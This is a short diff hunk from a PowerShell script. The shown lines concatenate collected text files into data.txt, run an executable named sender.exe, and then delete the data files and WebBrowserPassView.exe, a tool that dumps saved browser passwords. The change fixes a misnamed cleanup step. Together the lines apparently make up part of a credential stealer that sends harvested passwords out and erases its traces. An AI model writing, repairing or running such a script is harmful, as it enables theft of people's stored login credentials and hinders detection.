@@ -9,7 +9,7 @@ Start-Sleep 3
 Get-Content -Path f.txt, f2.txt > data.txt
 .\sender.exe
 Start-Sleep 5
-Remove-Item .\dane.txt
+Remove-Item .\data.txt
 Remove-Item .\f.txt
 Remove-Item .\f2.txt
 Remove-Item .\WebBrowserPassView.exe
